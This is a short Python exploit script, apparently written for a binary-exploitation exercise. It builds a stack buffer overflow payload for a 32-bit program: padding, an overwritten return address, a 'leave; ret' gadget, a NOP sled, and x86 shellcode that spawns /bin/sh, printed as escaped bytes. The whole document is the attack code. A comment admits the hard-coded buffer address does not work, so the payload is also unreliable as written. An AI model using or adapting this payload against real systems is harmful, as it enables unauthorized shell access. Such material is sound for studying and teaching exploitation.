from struct import pack as p

buffer_size = 76
ebp_size = 4

shellcode = b"\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" # shellcode
shellcode = b"\x90" * 100 + shellcode

buffer_addr = 0xffffaa8c # start address of our buffer (doesnt work lol)
gadget_addr = 0x080484d1 # ROP gadget (leave; ret)

shellcode_addr = buffer_addr + buffer_size + ebp_size + 4

payload = b"A" * buffer_size
payload += p("<I", shellcode_addr)
payload += p("<I", gadget_addr)
payload += shellcode

for c in payload:
    print("\\x%02x" % c, end="")
